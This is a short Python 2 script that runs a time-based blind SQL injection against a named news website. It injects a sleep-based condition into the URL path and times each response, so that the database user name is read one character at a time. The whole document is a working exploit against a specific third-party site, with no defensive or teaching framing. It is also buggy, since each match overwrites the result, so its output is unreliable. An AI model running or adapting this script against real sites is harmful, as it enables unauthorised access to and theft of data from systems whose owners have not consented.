#coding=utf-8
#author:wsg00d

import requests
import time
data=''
for j in range(1,20):
    for i in range(32,127):
        url='http://travel.qingdaonews.com/wap/zb-if(ascii(mid(user(),'+str(j)+',1))='+str(i)+',sleep(5),0)'
        starttime=time.time()
        reponse=requests.get(url)
        if time.time()-starttime>5:
            data=str(i)+','
            print data
            break
print 'the final result is:'+data
